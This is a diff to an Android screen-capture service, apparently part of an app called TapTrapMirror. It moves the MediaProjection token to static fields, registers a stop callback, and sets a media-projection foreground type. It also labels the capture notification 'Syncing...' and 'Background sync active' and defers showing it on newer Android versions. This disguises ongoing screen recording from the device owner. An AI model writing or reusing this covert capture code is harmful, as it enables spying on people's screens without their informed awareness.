@@ -46,15 +46,18 @@ public class ScreenMirrorService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        startForeground(1, buildNotification());
+        // ✅ new — explicitly pass the type
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
+            startForeground(1, buildNotification(),
+                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
+        } else {
+            startForeground(1, buildNotification());
+        }
 
         handler = new Handler(Looper.getMainLooper());
 
-        // ✅ Read from intent instead of static fields
-        int resultCode = intent.getIntExtra("resultCode", -1);
-        Intent resultData = intent.getParcelableExtra("resultData");
-
-        if (resultCode == -1 || resultData == null) {
+        // ✅ Use static fields directly instead of intent extras
+        if (sResultCode == 0 || sResultData == null) {
             Log.e(TAG, "❌ No MediaProjection token!");
             stopSelf();
             return START_NOT_STICKY;
@@ -63,7 +66,7 @@ public class ScreenMirrorService extends Service {
         MediaProjectionManager mpm = (MediaProjectionManager)
                 getSystemService(Context.MEDIA_PROJECTION_SERVICE);
 
-        mediaProjection = mpm.getMediaProjection(resultCode, resultData);
+        mediaProjection = mpm.getMediaProjection(sResultCode, sResultData);
 
         if (mediaProjection == null) {
             Log.e(TAG, "❌ MediaProjection is null!");
@@ -89,6 +92,16 @@ public class ScreenMirrorService extends Service {
         int dpi = metrics.densityDpi;
 
         imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
+
+        // ✅ Register callback BEFORE createVirtualDisplay (required on API 34)
+        mediaProjection.registerCallback(new MediaProjection.Callback() {
+            @Override
+            public void onStop() {
+                Log.d(TAG, "🛑 MediaProjection stopped");
+                isRunning = false;
+                if (virtualDisplay != null) virtualDisplay.release();
+            }
+        }, handler);
 
         virtualDisplay = mediaProjection.createVirtualDisplay(
                 "TapTrapMirror",
@@ -169,11 +182,17 @@ public class ScreenMirrorService extends Service {
                 CHANNEL_ID, "Screen Mirror", NotificationManager.IMPORTANCE_LOW);
         nm.createNotificationChannel(channel);
 
-        return new Notification.Builder(this, CHANNEL_ID)
+        Notification.Builder builder = new Notification.Builder(this, CHANNEL_ID)
                 .setContentTitle("Syncing...")
                 .setContentText("Background sync active")
-                .setSmallIcon(android.R.drawable.ic_menu_gallery)
-                .build();
+                .setSmallIcon(android.R.drawable.ic_dialog_info);
+
+        // ✅ Wrap in if block to satisfy compiler
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
+            builder.setForegroundServiceBehavior(Notification.FOREGROUND_SERVICE_DEFERRED);
+        }
+
+        return builder.build();
     }
 
     @Override
